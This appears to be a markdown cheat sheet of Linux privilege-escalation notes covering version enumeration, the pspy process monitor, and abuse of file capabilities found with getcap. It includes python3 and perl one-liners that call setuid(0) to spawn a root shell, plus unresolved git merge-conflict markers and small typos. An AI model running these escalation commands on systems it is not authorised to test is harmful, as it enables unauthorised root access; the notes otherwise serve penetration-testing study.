### Linux version

##### Distribution 
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release
cat /etc/redhat-release
##### Kernel Version
at /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-

### Linux Process

1. pspy
[pspy](https://github.com/DominicBreuker/pspy#how-it-works) is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. 
It heavily uses the [inotify API](https://man7.org/linux/man-pages/man7/inotify.7.html) provides a mechanism for monitoring filesystem events.
Inotify can be used to monitor individual files, or to monitor directories.


### Linux Capabilities 
1. getcap
The [getcap](https://www.man7.org/linux/man-pages/man8/getcap.8.html) command displays the name and capabilities of each specified file.
To recursively check the capabilities of all files you have access, use the following command **getcap -r / 2>/dev/null**
For instance, you can find Python or Perl that are assigned to root and you can do the following then:
- ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
- ./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'


<<<<<<< HEAD
###### *If you don't know, now you know: [Capabilities](https://linux.die.net/man/7/capabilities)*
=======
*If you don't know, now you know : [Capabilities](https://linux.die.net/man/7/capabilities)*
>>>>>>> 0005fd72b988749ff1b7a16d8bcfa705cf347fb3

Starting with kernel 2.2, Linux divides the privileges traditionally associated with superuser into distinct units, known as *capabilities*, which can be independently enabled and disabled. Capabilities are a per-thread attribute.

Some capabilities to look for are:
- **CAP_DAC_OVERRID**: Bypass file read, write, and execute permission checks.
- **CAP_DAC_READ_SEARCH**: Bypass file read permission checks and directory read and execute permission checks
- **CAP_SETGID**: Make arbitrary manipulations of process GIDs and supplementary GID list
- **CAP_SETUID**: Make arbitrary manipulations of process UIDs

<<<<<<< HEAD
##### source:
=======
#####source:
>>>>>>> 0005fd72b988749ff1b7a16d8bcfa705cf347fb3

https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/
https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/

<<<<<<< HEAD
##### Temp
=======
#####Temp
>>>>>>> 0005fd72b988749ff1b7a16d8bcfa705cf347fb3

ip addr

-> docker0